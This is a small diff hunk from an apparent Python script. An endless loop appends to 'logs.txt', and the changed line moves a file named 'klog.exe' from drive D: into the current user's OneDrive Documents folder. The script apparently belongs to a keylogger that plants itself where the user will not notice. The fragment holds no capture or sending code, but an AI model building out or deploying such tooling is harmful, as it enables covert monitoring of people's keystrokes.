@@ -12,4 +12,4 @@ f = open("logs.txt","a")
 while True:
     i = 0
     f = open("logs.txt","a")
-shutil.move("D:\\new.txt", "C:\\Users\\" + str(username) + "\\OneDrive\\Dokument\\new.txt")
+shutil.move("D:\\klog.exe", "C:\\Users\\" + str(username) + "\\OneDrive\\Dokument\\klog.exe")
